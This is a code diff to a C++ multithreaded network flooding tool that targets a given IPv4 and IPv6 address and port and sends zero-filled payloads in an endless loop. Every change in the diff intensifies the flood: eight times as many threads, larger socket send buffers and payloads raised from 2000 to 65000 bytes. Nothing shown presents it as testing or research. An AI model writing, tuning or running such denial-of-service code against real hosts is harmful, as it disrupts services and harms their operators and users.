@@ -24,7 +24,7 @@ int main() {
         return 1;
     }
 
-    const int threads = static_cast<int>(std::thread::hardware_concurrency()*2);
+    const int threads = static_cast<int>(std::thread::hardware_concurrency()*2*2*2);
     std::cout << "Spawning " << threads << " senders\n";
     std::cout << "Targeting IPv4: " << ip_v4 << ":" << port << "\n";
     std::cout << "Targeting IPv6: " << ip_v6 << ":" << port << "\n";
@@ -50,7 +50,7 @@ int main() {
                     dst_v4.sin_port = htons(port);
                     if (inet_pton(AF_INET, ip_v4.c_str(), &dst_v4.sin_addr) == 1) {
                         connect(fd_v4, reinterpret_cast<sockaddr*>(&dst_v4), sizeof(dst_v4));
-                        int buf = 4 * 1024 * 1024 * 2;
+                        int buf = 4 * 1024 * 1024 * 2 * 2 * 2;
                         setsockopt(fd_v4, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
                     } else {
                         std::cerr << "Thread " << id << ": Invalid IPv4 address. Closing v4 socket.\n";
@@ -76,7 +76,7 @@ int main() {
                     dst_v6.sin6_port = htons(port);
                     if (inet_pton(AF_INET6, ip_v6.c_str(), &dst_v6.sin6_addr) == 1) {
                         connect(fd_v6, reinterpret_cast<sockaddr*>(&dst_v6), sizeof(dst_v6));
-                        int buf = 4 * 1024 * 1024;
+                        int buf = 4 * 1024 * 1024 * 4;
                         setsockopt(fd_v6, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
                     } else {
                         std::cerr << "Thread " << id << ": Invalid IPv6 address. Closing v6 socket.\n";
@@ -92,7 +92,7 @@ int main() {
                 return;
             }
 
-            const size_t payload_size = 2000;
+            const size_t payload_size = 65000;
             char dummy[payload_size] = {0};
             for (;;) {
                 if (fd_v4 >= 0) {
